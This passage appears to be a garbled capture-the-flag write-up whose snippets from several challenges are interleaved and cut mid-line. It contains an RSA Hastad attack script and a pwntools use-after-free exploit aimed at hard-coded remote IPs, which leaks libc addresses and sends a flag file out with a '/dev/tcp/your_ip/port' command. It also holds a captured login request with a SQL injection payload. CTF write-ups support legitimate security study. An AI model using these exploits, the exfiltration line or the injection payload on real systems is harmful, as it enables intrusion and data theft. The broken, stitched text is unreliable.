, and we can calculate it
by
Note: all the computation is over 
, where the order  can be found by factoring 
.
The exploit is written as below:
if ( (a>0 && a 0 && b 0 && c 
q = 1039300813886545966418005631983853921163721828798787466771912919828750891
x1 = atoi(M1) % q
x2 = atoi(M2) % q
a1_hat = cal_a_hat(x1)
a2_hat = cal_a_hat(x2)
r2 = (x1 + a1_hat*r1 - x2) * inverse(a2_hat, q) % q
print(r2)
# 299610740605778098196154877327490870095375317123548563579894088319476495
from Crypto.Util.number import long_to_bytes
def hastads(cArray,nArray,e=3):
    """
    Performs Hastads attack on raw RSA with no padding.
    cArray = Ciphertext Array
    nArray = Modulus Array
    e = public exponent
    """
    if(len(cArray)==len(nArray)==e):
        for i in range(e):
            cArray[i] = Integer(cArray[i])
            nArray[i] = Integer(nArray[i])
CTB
Pwnogram
editmsgUAF
client1:
        M = crt(cArray,nArray)
        return(Integer(M).nth_root(e,truncate_mode=1))
    else:
        print("CiphertextArray, ModulusArray, need to be of the same length, 
and the same size as the public exponent")
NA = 
924506488821656685683910901697171383575761384058997452768161613244316449994435
541406042874502024337501621283644549497446327156438552952982774526792356194523
541927862677535193330297876054850415513120023262998063090052673978470859715791
539316871
NB = 
889509371172553912239774356984862654687896760873837490259005804768579585774583
612518553585989606384958736634083301009698127599596375832972110682747931213790
54729169786199319454344007481804946263873110263761707375758247409
NC = 
461204241242834076318777399187174977454994484420816049087170693113397643027165
398995493824709884695469146604201904733791873974257253028991114323047534185085
019042777117723730065430990779210973735523178230525702529781448357449499411084
16471431004677
c1 = 
388825822870813587493154615238012547494666151428446904627095554917874019374474
234421038941934804209410745453928513883448152675699305596595130706561989245940
306390625802518940063853046813376063232724848204735684760377804361178651844505
881089386
c2 = 
413209914578647858057370128104050442233218401779229342189070126801288356685325
462786019372480980899900523334905784737579862612320776695426650741196980265422
6242300965967704040276250440511648395550180630597000941240639594
c3 = 
436903924794787338021756191515195234532012009428005364948065129903505049640442
899984953998053359422275866948523632728833310801881613084705223064859838611145
574492048876448904099955988522994886281592240127303728652805409448979154356041
54376354144428
m = hastads([c1,c2,c3],[NA,NB,NC])[0]
print(long_to_bytes(m)[::-1])
from pwn import *
import time
def msg(ty,bo,le):
    return p32(le+8)+p64(ty)+bo
def register(username):
     p.send(p32(len(username)+0x8+8))
     p.send(p64(0))
     p.send(p64(len(username))+username)
def addchat(username,chatname):
     p.send(p32(len(username)+len(chatname)+0x10+8))
     p.send(p64(1))
     p.send(p64(len(username))+username+p64(len(chatname))+chatname)
def joinchat(username,chatname):
     p.send(p32(len(username)+len(chatname)+0x10+8))
     p.send(p64(2))
     p.send(p64(len(username))+username+p64(len(chatname))+chatname)
def sendmsg(username,chatname,msg):
     p.send(p32(len(username)+len(chatname)+len(msg)+0x18+8))
     p.send(p64(3))
p.send(p64(len(username))+username+p64(len(chatname))+chatname+p64(len(msg))+m
sg)
def editmsg(username,chatname,index,msg):
     p.send(p32(len(username)+len(chatname)+len(msg)+0x20+8))
     p.send(p64(4))
p.send(p64(len(username))+username+p64(len(chatname))+chatname+index+p64(len(m
sg))+msg)
def deletemsg(username,chatname,index):
     p.send(p32(len(username)+len(chatname)+0x18+8))
     p.send(p64(5))
     p.send(p64(len(username))+username+p64(len(chatname))+chatname+index)
def forwardmsg(username,chatname,index):
     p.send(p32(len(username)+len(chatname)+len(msg)+0x20+8))
     p.send(p64(6))
p.send(p64(len(username))+username+p64(len(chatname))+chatname+p64(len(msg))+m
sg+index)
def getmsg(chatname,index):
     p.send(p32(len(chatname)+0x10+8))
     p.send(p64(7))
     p.send(p64(len(chatname))+chatname+index)
def listmsg(chatname):
client2:
     p.send(p32(len(chatname)+8+8))
     p.send(p64(8))
     p.send(p64(len(chatname))+chatname)
context.log_level="debug"
p=remote("34.77.235.192",41646)
register("kirin")
time.sleep(2)
addchat("kirin","1111")
time.sleep(2)
sendmsg("kirin","1111","a"*0x20)
time.sleep(2)
p.recv(1024)
listmsg("1111")
s=p.recvuntil("\\x7f")[-6:]
magic=u64(s+"\\x00\\x00")
print hex(magic)
deletemsg("kirin","1111",p64(magic))
p.interactive()
magic=#input client1's magic
context.log_level="debug"
p=remote("34.77.235.192",38597)
#editmsg("kirin","1111",p64(0x7f5318000d00),"8"*0x10)
#getmsg("1111",p64(0x7f0768000d00))
sendmsg("kirin","1111","8"*0x90)
time.sleep(2)
p.recv(1024)
getmsg("1111",p64(magic))
time.sleep(2)
p.recvuntil("kirin")
p.recv(8)
base=u64(p.recv(8))-0x22e840
print hex(base)
editmsg("kirin","1111",p64(magic),p64(base+0x22e840)+p64(base+0x22EDD0))
time.sleep(2)
p.recv(1024)
getmsg("1111",p64(magic+0x30))
time.sleep(2)
p.recvuntil("kirin")
p.recv(8)
libc=u64(p.recv(8))-0x00064e10
print hex(libc)
editmsg("kirin","1111",p64(magic),p64(base+0x22e840)+p64(libc+0x01eeb28))
time.sleep(2)
editmsg("kirin","1111",p64(magic+0x30),p64(libc+0x0055410))
DockEsc
ctrl+p,picture is worth a thousand words
Forensic
Krevedka
300MB
http contains login && http.request.method==POST && http contains caleches
time.sleep(2)
sendmsg("kirin","1111",'echo "cat /flag > /dev/tcp/your_ip/port" > 
./1.sh\\x00')
p.recv()
sendmsg("kirin","1111",'chmod +x ./1.sh\\x00')
p.recv()
sendmsg("kirin","1111",'bash ./1.sh\\x00')
p.interactive()
POST /login HTTP/1.1
Host: kr3vedko.com
User-Agent: UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; 
www1.smart.com.ph/; GT-S5360) U2/1.0.0 UCBrowser/9.8.0.534 Mobile
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: session=b75d53bb-1326-4d78-aedf-9bd92e237fbf
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
login=caleches&password=%22+or+1%3D1+--
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 209
Location: 
Set-Cookie: session=b75d53bb-1326-4d78-aedf-9bd92e237fbf; Expires=Wed, 22-Jul-
2020 20:44:03 GMT; HttpOnly; Path=/
Server: Werkzeug/1.0.1 Python/3.8.2
Date: Wed, 22 Jul 2020 15:44:03 GMT
Redirecting...
Redirecting...
http.user_agent == "UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; www1.smart.com.ph/;
GT-S5360) U2/1.0.0 UCBrowser/9.8.0.534 Mobile"
micropetalous
Keyshooter
You should be redirected automatically to target URL: /. 
 If not click the link.